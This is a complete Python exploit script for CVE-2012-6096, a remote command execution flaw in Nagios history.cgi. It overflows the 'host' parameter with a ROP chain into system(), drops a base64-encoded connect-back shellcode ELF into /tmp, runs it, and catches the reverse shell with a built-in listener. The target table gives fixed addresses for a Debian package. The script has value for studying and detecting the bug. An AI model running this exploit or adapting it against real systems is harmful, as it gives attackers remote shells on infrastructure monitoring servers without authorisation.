#!/usr/bin/python
#
# CVE-2012-6096 - Nagios history.cgi Remote Command Execution
# ===========================================================
# Another year, another reincarnation of classic and trivial
# bugs to exploit. This time we attack Nagios.. or more
# specifically, one of its CGI scripts. [1]
#
# The Nagios code is an amazing monster. It reminds me a
# lot of some of my early experiments in C, back when I
# still had no clue what I was doing. (Ok, fair enough,
# I still don't, heheh.)
#
# Ok, I'll come clean. This exploit doesn't exactly
# defeat FORTIFY. This approach is likely to work just FINE
# on other crippled distro's though, think of stuff like
# ArchLinux, Slackware, and all those Gentoo kids twiddling
# their CFLAGS. [2] (Oh and hey, BSD and stuff!)
#
# I do some very stupid shit(tm) here that might make an
# exploit coder or two cringe. My sincere apologies for that.
#
# Cold beer goes out to my friends who are still practicing
# this dying but interesting type of art:
#
#   * brainsmoke * masc * iZsh * skier_ * steve *
#
# -- blasty <blasty@fail0verflow.com> / 2013-01-08
#
# References:
# [1] http://permalink.gmane.org/gmane.comp.security.oss.general/9109
# [2] http://www.funroll-loops.info/
#
# P.S. To the clown who rebranded my Samba exploit: j00 s0 1337 m4n!
# Next time you rebrand an exploit at least show some diligence and
# add some additional targets or improvements, so we can all profit!
#
# P.P.S. hey, Im not _burning_ bugs .. this is a 2day, enjoy!
#
 
import os, sys, socket, struct, urllib, threading, SocketServer, time
from base64 import b64encode
 
SocketServer.TCPServer.allow_reuse_address = True
 
targets = [
    {
        "name"       : "Debian (nagios3_3.0.6-4~lenny2_i386.deb)",
        "smash_len"  : 0xc37,
        "unescape"   : 0x0804b620,
        "popret"     : 0x08048fe4,
        "hostbuf"    : 0x080727a0,
        "system_plt" : 0x08048c7c
    }
]
 
def u32h(v):
    return struct.pack("<L", v).encode('hex')
 
def u32(v, hex = False):
    return struct.pack("<L", v)
 
# Tiny ELF stub based on:
# http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html
def make_elf(sc):
    elf_head = \
        "7f454c46010101000000000000000000" + \
        "02000300010000005480040834000000" + \
        "00000000000000003400200001000000" + \
        "00000000010000000000000000800408" + \
        "00800408" + u32h(0x54+len(sc))*2  + \
        "0500000000100000"
 
    return elf_head.decode("hex") + sc
 
# interactive connectback listener
class connectback_shell(SocketServer.BaseRequestHandler):
    def handle(self):
        print "\n[!!] K4P0W!@# -> shell from %s" % self.client_address[0]
        print "[**] This shell is powered by insane amounts of illegal substances"
  
        s = self.request
  
        import termios, tty, select, os
        old_settings = termios.tcgetattr(0)
 
        try:
            tty.setcbreak(0)
            c = True
 
            os.write(s.fileno(), "id\nuname -a\n")
 
            while c:
                for i in select.select([0, s.fileno()], [], [], 0)[0]:
                    c = os.read(i, 1024)
                    if c:
                        if i == 0:
                            os.write(1, c)
  
                        os.write(s.fileno() if i == 0 else 1, c)
        except KeyboardInterrupt: pass
        finally: termios.tcsetattr(0, termios.TCSADRAIN, old_settings)
  
        return
  
class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    pass
 
if len(sys.argv) != 5:
    print "\n  >> Nagios 3.x CGI remote code execution by <blasty@fail0verflow.com>"
    print "  >> \"Jetzt geht's Nagi-los!\"\n"
    print "  usage: %s <base_uri> <myip> <myport> <target>\n" % (sys.argv[0])
    print "  targets:"
 
    i = 0
 
    for target in targets:
        print " %02d) %s" % (i, target['name'])
        i = i+1
  
    print ""
    sys.exit(-1)
 
target_no = int(sys.argv[4])
 
if target_no < 0 or target_no > len(targets):
    print "Invalid target specified"
    sys.exit(-1)
 
target = targets[ int(sys.argv[4]) ]
 
# comment this shit if you want to setup your own listener
server = ThreadedTCPServer((sys.argv[2], int(sys.argv[3])), connectback_shell)
server_thread = threading.Thread(target=server.serve_forever)
server_thread.daemon = True
server_thread.start()
 
# shellcode to be executed
# vanilla x86/linux connectback written by a dutch gentleman
# close to a decade ago.
cback = \
    "31c031db31c951b10651b10151b10251" + \
    "89e1b301b066cd8089c231c031c95151" + \
    "68badc0ded6668b0efb102665189e7b3" + \
    "1053575289e1b303b066cd8031c939c1" + \
    "740631c0b001cd8031c0b03f89d3cd80" + \
    "31c0b03f89d3b101cd8031c0b03f89d3" + \
    "b102cd8031c031d250686e2f7368682f" + \
    "2f626989e3505389e1b00bcd8031c0b0" + \
    "01cd80"
 
cback = cback.replace("badc0ded", socket.inet_aton(sys.argv[2]).encode("hex"))
cback = cback.replace("b0ef", struct.pack(">H", int(sys.argv[3])).encode("hex"))
 
# Eww.. so there's some characters that dont survive the trip..
# yes, even with the unescape() call in our return-chain..
# initially I was going to use some /dev/tcp based connectback..
# but /dev/tcp isn't available/accesible everywhere, so instead
# we drop an ELF into /tmp and execute that. The '>' characters
# also doesn't survive the trip so we work around this by using
# the tee(1) utility.
# If your target has a /tmp that is mounted with noexec flag,
# is severely firewalled or guarded by trained (watch)dogs..
# you might want to reconsider this approach!
cmd  = \
    "rm -rf /tmp/x;" + \
    "echo " + b64encode(make_elf(cback.decode('hex'))) + "|" + \
    "base64 -d|tee /tmp/x|chmod +x /tmp/x;/tmp/x;"
 
# Spaces (0x20) are also a problem, they always ends up as '+' :-(
# so apply some olde trick and rely on $IFS for argv separation
cmd = cmd.replace(" ", "${IFS}")
 
# Basic return-2-whatever/ROP chain.
# We return into cgi_input_unescape() to get rid of
# URL escaping in a static buffer we control, and then
# we return into system@plt for the moneyshot.
#
# Ergo sum:
# There's no memoryleak or whatever needed to leak libc
# base and bypass ASLR.. This entire Nagios PoS is stringed
# together by system() calls, so pretty much every single one
# of their little silly binaries comes with a PLT entry for
# system(), huzzah!
rop = [
    u32(target['unescape']),
    u32(target['popret']),
    u32(target['hostbuf']),
    u32(target['system_plt']),
    u32(0xdeafbabe),
    u32(target['hostbuf'])
]
 
# Yes.. urllib, so it supports HTTPS, basic-auth and whatnot
# out of the box. Building HTTP requests from scratch is so 90ies..
params = urllib.urlencode({
    'host' : cmd + "A"*(target['smash_len']-len(cmd)) + "".join(rop)
})
 
print "[>>] CL1Q .."
f = urllib.urlopen(sys.argv[1]+"/cgi-bin/history.cgi?%s" % params)
 
print "[>>] CL4Q .."
f.read()
 
# TRIAL PERIOD ACTIVE, LOL!
time.sleep(0x666)
 
server.shutdown()
